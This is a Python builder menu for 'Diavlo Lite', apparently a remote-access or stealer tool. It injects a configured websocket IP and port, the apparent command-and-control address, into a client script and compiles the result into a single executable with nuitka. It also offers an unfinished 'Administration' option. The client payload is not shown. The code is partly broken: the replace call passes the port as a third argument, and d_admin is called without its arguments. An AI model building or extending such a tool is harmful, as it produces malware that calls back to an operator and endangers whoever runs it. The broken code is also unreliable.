import colorama, shutil, os, time, json
from colorama import Fore

logo = """
  _____  _             _         _      _ _       
 |  __ \(_)           | |       | |    (_) |      
 | |  | |_  __ ___   _| | ___   | |     _| |_ ___ 
 | |  | | |/ _` \ \ / / |/ _ \  | |    | | __/ _ \\
 | |__| | | (_| |\ V /| | (_) | | |____| | ||  __/
 |_____/|_|\__,_| \_/ |_|\___/  |______|_|\__\___|
"""
config = ""

def d_compile():
  content = ""
  with open('client/main.py', 'r', encoding='latin-1') as f:
    lines = f.readlines()
    for line in lines:
      if "%WEBSOCKET HERE%" in line:
        content+=line.replace("%WEBSOCKET HERE%", config['websocket']['ip'], config['websocket']['port'])
      else:
        content+=line
  with open('build.py', 'w', encoding='latin-1') as f:
    f.write(content)
  os.system("nuitka build.py --onefile --include-package=websockets")

def d_admin(ip, port):
  print()

def loadConfig():
  with open('config.json', 'r') as f:
    file = f.read()
    global config
    config = json.loads(file)

def printcenter(text):
    size = shutil.get_terminal_size().columns
    for line in text.split("\n"):
        print(' ' * (round((size/2)-len(line)/2)), line)

def main():
  os.system("cls || clear")
  printcenter(Fore.RED + logo)
  print()
  printcenter("Made by github.com/compromissed/DiavloLite")
  printcenter("Credits to original owners SerLink04 & Baguette & ItsJokerZ")
  print()
  printcenter(f"{Fore.BLUE}1) {Fore.CYAN}Compile Diavlo Lite\n{Fore.BLUE}2) {Fore.CYAN}Administration")
  print()
  print(f"{Fore.GREEN}WebSocket IP: {Fore.RESET}{config['websocket']['ip']}")
  print(f"{Fore.GREEN}WebSocket Port: {Fore.RESET}{config['websocket']['port']}")
  print()
  option = input(f"{Fore.LIGHTRED_EX}[»] {Fore.RED}Select an option: {Fore.RESET}")
  if option == "1":
    d_compile()
  elif option == "2":
    if not (config['websocket']['ip'] == "Not set." and config['websocket']['port'] == "Not set."):
      d_admin()
    else:
      print(Fore.RED+"To access this you need to configure a Diavlo WebSocket!")
      time.sleep(3)
      main()
  else:
    print(Fore.RED+"Invalid option. Try again.")
    time.sleep(3)
    main()

loadConfig()
main()
